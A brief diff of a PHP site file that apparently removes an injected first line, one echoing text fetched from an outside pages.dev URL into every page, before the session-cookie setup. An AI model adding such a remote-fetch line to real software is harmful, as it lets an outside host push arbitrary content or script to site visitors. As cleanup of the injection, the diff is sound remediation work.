@@ -1,4 +1,4 @@
-<?php echo file_get_contents("https://punten-neng.pages.dev/punten.txt");?>
+
 <?php
 $lifetime=2592000;
 session_set_cookie_params($lifetime);
@@ -121,3 +121,4 @@ if ($plugins['shop'] == 1) {
 }
 
 ?>
+
